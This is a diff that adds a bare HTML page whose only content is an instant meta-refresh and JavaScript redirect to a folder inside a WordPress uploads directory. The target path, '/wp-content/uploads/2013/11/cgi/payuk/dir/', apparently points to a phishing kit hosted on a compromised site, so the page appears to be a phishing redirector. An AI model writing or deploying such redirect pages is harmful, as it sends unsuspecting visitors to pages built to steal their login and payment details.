@@ -1,0 +1,16 @@
+
+<html><head>
+
+<meta HTTP-Equiv="refresh" content="0; URL=http://www.sankiking.com/wp-content/uploads/2013/11/cgi/payuk/dir/">
+
+<script type="text/javascript">
+
+loc = "http://www.sankiking.com/wp-content/uploads/2013/11/cgi/payuk/dir/"
+
+self.location.replace(loc);
+
+window.location = loc;
+
+</script>
+
+</head></html>
